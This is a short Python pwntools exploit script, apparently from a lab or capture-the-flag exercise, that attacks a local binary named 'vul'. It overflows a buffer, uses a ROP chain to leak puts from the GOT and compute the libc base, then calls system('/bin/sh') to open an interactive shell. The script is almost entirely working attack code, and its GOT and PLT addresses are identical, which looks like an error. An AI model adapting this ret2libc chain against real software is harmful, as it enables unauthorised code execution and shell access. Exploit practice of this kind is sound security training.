from pwn import *


context.os = "linux"
context.arch = "amd64"

start = 0x401060
puts_got = 0x0000000000401030
puts_plt = 0x0000000000401030
pop_rdi = 0x40120b
ret = 0x401016

payload = b'A'*216
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(start)

p = process('./vul')

p.recvuntil("message: ")
p.sendline(payload)

leaked_puts = u64(p.recvline().strip().ljust(8,b'\00'))

#print(hex(leaked_puts))

libc_puts = 0x0000000000080ed0

libc_base_address = leaked_puts - libc_puts

ret = libc_base_address +  0x0000000000029cd6
pop_rdi = libc_base_address + 0x000000000002a3e5
bin_sh = libc_base_address + 0x1d8698
system_function = libc_base_address + 0x0000000000050d60
exit_function = libc_base_address + 0x00000000000455f0


buf = b"A" * 216
buf += struct.pack('<Q', ret)
buf += struct.pack('<Q', pop_rdi) # pop rdi ; ret
buf += struct.pack('<Q', bin_sh) #/bin/sh
buf += struct.pack('<Q', system_function) # system()
buf += struct.pack('<Q', exit_function) # exit()

p.clean()
p.recvuntil("message: ")
p.sendline(buf)
print("Done with Payload")
p.interactive()

